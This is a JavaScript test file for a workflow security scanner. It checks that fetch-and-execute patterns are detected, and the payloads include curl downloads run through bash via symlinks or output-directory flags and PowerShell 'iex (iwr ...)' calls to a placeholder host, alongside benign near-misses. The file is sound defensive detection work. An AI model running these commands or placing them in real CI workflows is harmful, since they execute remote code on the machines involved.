'use strict';
// New external review evidence; all shell/PowerShell samples remain inert data.
const test=require('node:test'),assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/remote';
const positives=[
 ['relative-symlink',"mkdir -p dir; curl -fsSL "+U+" -o dir/payload; ln -s payload dir/run.sh; bash dir/run.sh",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['parent-symlink',"mkdir -p dir; curl -fsSL "+U+" -o payload; ln -s ../payload dir/run.sh; bash dir/run.sh",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['quoted-exec-single',"curl -fsSL "+U+" -o payload; bash 'payload'",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['quoted-exec-double',"curl -fsSL "+U+" -o payload; bash \"./payload\"",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['output-dir-separated',"curl -fsSL --output-dir dir -o payload "+U+"; bash dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['output-dir-joined',"curl -fsSL --output-dir=dir -opayload "+U+"; sh ./dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['powershell-uri-quoted',"iex (iwr -Uri '"+U+"').Content",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['powershell-irm-uri',"iex (irm -Uri \""+U+"\")",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['powershell-explicit-uri',"pwsh -Command \"iex (iwr -Uri "+U+").Content\"",'REMOTE_POWERSHELL_EXECUTION']
];
function audit(script,shell){
 const yaml=['on: issues','permissions: read-all','jobs:','  auditor:',
 '    runs-on: ubuntu-latest','    steps:','      - run: |',
 ...script.split('\n').map(s=>'          '+s),
 ...(shell?['        shell: '+shell]:[])].join('\n')+'\n';
 return inspectWorkflow(yaml,{path:'.github/workflows/round4.yml'});
}
for(const [name,script,rule,shell] of positives){
 test('Codex round4 '+name+' is detected',()=>{
  const direct=findingsForScript(script,{shell});
  assert.ok(direct.includes(rule),name+' direct '+JSON.stringify(direct));
  const structural=audit(script,shell);
  assert.ok(structural.findings.some(x=>x.rule===rule&&x.severity==='HIGH'),
   name+' structural '+JSON.stringify(structural));
 });
}
const benign=[
 ['relative-symlink-not-source',"curl -fsSL "+U+" -o payload; ln -s payload dir/run.sh; bash dir/run.sh"],
 ['output-dir-not-executed',"curl -fsSL --output-dir dir -o payload "+U+"; echo dir/payload"],
 ['output-file-not-executed',"curl -fsSL "+U+" -o payload; echo 'bash payload'"],
 ['pwsh-fetch-only',"iwr -Uri '"+U+"'",'pwsh'],
 ['pwsh-quoted-documentation',"Write-Host \"iex (iwr -Uri "+U+").Content\"",'pwsh']
];
for(const [name,script,shell] of benign){
 test('Codex round4 harmless '+name+' remains clean',()=>{
  const direct=findingsForScript(script,{shell});
  assert.ok(!direct.some(x=>x.startsWith('REMOTE_')),name+': '+JSON.stringify(direct));
 });
}
